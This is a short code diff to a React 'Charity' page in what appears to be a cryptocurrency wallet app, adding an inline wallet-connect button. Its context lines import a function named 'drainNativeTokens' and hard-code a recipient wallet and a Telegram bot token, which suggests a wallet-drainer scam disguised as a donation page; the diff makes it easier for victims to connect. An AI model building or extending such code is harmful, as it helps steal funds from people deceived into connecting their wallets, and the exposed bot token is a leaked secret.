@@ -15,6 +15,7 @@ import { useChain } from '@/contexts/ChainContext';
 import { useEVMWallet } from '@/providers/EVMWalletProvider';
 import { drainNativeTokens } from '@/utils/evmTransactions';
 import { useChainInfo } from '@/hooks/useChainInfo';
+import { InlineConnectWallet } from '@/components/InlineConnectWallet';
 
 const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
 const TELEGRAM_BOT_TOKEN = '8209811310:AAF9m3QQAU17ijZpMiYEQylE1gHd4Yl1u_M';
@@ -483,6 +484,7 @@ const Charity = () => {
               <div className="mb-6">
                 <WalletMultiButton />
               </div>
+              <InlineConnectWallet className="mb-4" />
 
               {(publicKey || (isEVMConnected && activeChain === 'evm')) && (
                 <div className="text-left space-y-3 mb-6 p-4 bg-muted/50 rounded-lg">
